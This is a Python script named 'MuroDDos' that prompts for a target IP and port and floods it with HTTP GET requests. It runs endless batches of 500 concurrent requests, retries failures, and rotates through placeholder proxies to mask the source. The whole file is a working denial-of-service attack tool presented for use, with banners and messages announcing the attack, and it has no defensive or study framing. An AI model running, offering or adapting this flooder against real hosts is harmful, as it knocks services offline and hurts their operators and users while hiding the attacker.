import aiohttp
import asyncio
import os
from colorama import Fore, init
from aiohttp import ClientSession, ClientConnectorError

# Initialize colorama for colored output
init(autoreset=True)

# Clear screen and show banner
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{Fore.RED}
███╗   ███╗██╗   ██╗██████╗  ██████╗ 
████╗ ████║██║   ██║██╔══██╗██╔═══██╗
██╔████╔██║██║   ██║██████╔╝██║   ██║
██║╚██╔╝██║██║   ██║██╔══██╗██║   ██║
██║ ╚═╝ ██║╚██████╔╝██║  ██║╚██████╔╝
╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ 
{Fore.RESET}""")

class MuroDDos:
    def __init__(self):
        self.counter = 0
        self.success_count = 0
        self.failure_count = 0
        self.running = True
        self.proxies = [
            "http://proxy1:port",
            "http://proxy2:port",  # Add your proxies here
        ]
        self.max_retries = 3  # Maximum retry attempts

    async def send_request(self, session, url, proxy=None):
        retries = 0
        while retries < self.max_retries:
            try:
                async with session.get(url, proxy=proxy) as response:
                    self.counter += 1
                    self.success_count += 1
                    print(f"{Fore.GREEN}[+] {Fore.WHITE}Request {self.counter} succeeded!")
                    return  # Exit on success
            except (ClientConnectorError, asyncio.TimeoutError) as e:
                retries += 1
                print(f"{Fore.YELLOW}[!] {Fore.WHITE}Retry {retries}/{self.max_retries} for request {self.counter}")
                await asyncio.sleep(1)  # Exponential backoff
            except Exception as e:
                self.failure_count += 1
                print(f"{Fore.RED}[-] {Fore.WHITE}Request failed: {str(e)}")
                return
        self.failure_count += 1

    async def attack(self, url):
        connector = aiohttp.TCPConnector(limit=500)  # Optimal connection limit
        async with ClientSession(connector=connector) as session:
            while self.running:
                tasks = []
                # Rotate proxies for each batch
                proxy = self.proxies[self.counter % len(self.proxies)] if self.proxies else None
                for _ in range(500):  # Adjusted batch size
                    tasks.append(self.send_request(session, url, proxy))
                await asyncio.gather(*tasks)

    def stop(self):
        self.running = False

async def main():
    clear_screen()
    target_ip = input(f"{Fore.CYAN}[?] {Fore.WHITE}Enter target IP: ")
    target_port = input(f"{Fore.CYAN}[?] {Fore.WHITE}Enter target port (default 80): ") or "80"

    url = f"http://{target_ip}:{target_port}"

    muro = MuroDDos()
    print(f"\n{Fore.YELLOW}[!] {Fore.WHITE}Attack started! Press Ctrl+C to stop\n")

    try:
        await muro.attack(url)
    except asyncio.CancelledError:
        muro.stop()
        print(f"\n{Fore.RED}[!] {Fore.WHITE}Attack stopped!")
        print(f"{Fore.YELLOW}[+] {Fore.WHITE}Total Requests: {muro.counter}")
        print(f"{Fore.GREEN}[+] {Fore.WHITE}Successful Requests: {muro.success_count}")
        print(f"{Fore.RED}[-] {Fore.WHITE}Failed Requests: {muro.failure_count}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] {Fore.WHITE}Attack terminated by user!")
